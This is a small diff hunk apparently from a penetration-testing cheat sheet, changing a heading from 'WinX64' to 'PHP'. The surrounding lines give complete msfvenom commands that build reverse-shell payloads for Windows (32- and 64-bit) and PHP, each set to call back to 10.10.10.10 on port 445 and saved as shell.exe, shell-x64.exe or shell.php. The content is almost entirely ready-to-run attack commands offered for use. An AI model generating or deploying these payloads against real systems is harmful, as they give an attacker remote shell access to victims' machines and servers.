@@ -8,7 +8,7 @@ msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=445 -f exe > shell
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=445 -f exe > shell-x64.exe
 ```
-### WinX64
+### PHP
 ```
 msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=445 -f raw > shell.php
 ```
